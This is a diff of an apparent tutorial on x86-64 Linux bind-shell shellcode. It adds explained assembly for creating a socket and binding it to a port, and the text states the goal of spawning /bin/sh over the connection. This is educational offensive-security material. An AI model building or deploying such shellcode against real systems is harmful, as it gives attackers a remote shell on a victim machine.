@@ -25,9 +25,11 @@ For Linux Sockets Programming, the following System calls are required on this a
 
 ```c
 int socket(int domain, int type, int protocol); 
-int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); 
+int bind(int sockfd, const struct sockaddr *addr, 
+         socklen_t addrlen); 
 int listen(int sockfd, int backlog); 
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); 
+int accept(int sockfd, struct sockaddr *addr, 
+           socklen_t *addrlen); 
 int close(int sockfd); 
 ```
 To duplicate the standard input, output and error, `dup2()` call will be used: 
@@ -39,14 +41,16 @@ int dup2(int oldfd, int newfd);
 And to execute `/bin/sh`, will use the `execve()` call: 
 
 ```c
-int execve(const char *filename, char *const argv[], char *const envp[]); 
+int execve(const char *filename, 
+           char *const argv[], 
+           char *const envp[]); 
 ```
 ### ASM Implementation
 ----
 
 Will explain how we implement each step mentioned before into ASM, with the idea to make the code easy to understand. No enphasys has been put into removing NULLs and make the shellcode small (this is done later).
 
-1. **CREATE A SOCKET**
+1. **Create a Socket**
 
 ```asm
 ; sock = socket(AF_INET, SOCK_STREAM, 0) 
@@ -66,13 +70,39 @@ To execute the sys_socket system call the arguments will have to be placed in th
  - RSI <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
  - RDX <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
 
+The syscall will return a file descriptor in RAX that is saved into RDI. This saves the socket_id for later use in the code
 
+2. **Bind the Created Socket to a Port**
+```asm
+; Prepare (struct sockaddr *)&server 
+;       RSP will point to the struct address 
+xor rax, rax 
+push rax                        ; bzero(&server.sin_zero, 8) 
 
+mov dword [rsp - 4], INADDR_ANY 
+mov word [rsp - 6], PORT 
+mov word [rsp - 8], AF_INET 
+sub rsp, 8                      ; Update RSP with right value 
 
+; bind(sock, (struct sockaddr *)&server, sockaddr_len) 
+;       RDI already has the sock_id 
+mov rax, 49                     ; syscall number 
+mov rsi, rsp                    ; @ to (struct sockaddr * &server) 
+mov rdx, 16                     ; length of the sockaddr struct 
+syscall  
+```
+This part irequires two steps:
 
+- Create the `struct sockaddr` structure. Stack is used to store the values of the struct:
+ - Values are placed on the stack
+ - Stack Pointer (RSP) is updated with the new address
+- Call the `bind` syscall. Values for parameters are placed into the registers:
+ - RAX: Syscall number (49)
+ - RDI: Socket descriptor. Already has the value from previous point
+ - RSI: Address of the struct. This value is in RSP
+ - RDX: The lengh of the sockaddr struct. It's 16 bytes
 
-
-
+### Listen for Incoming Connections
 
 
 
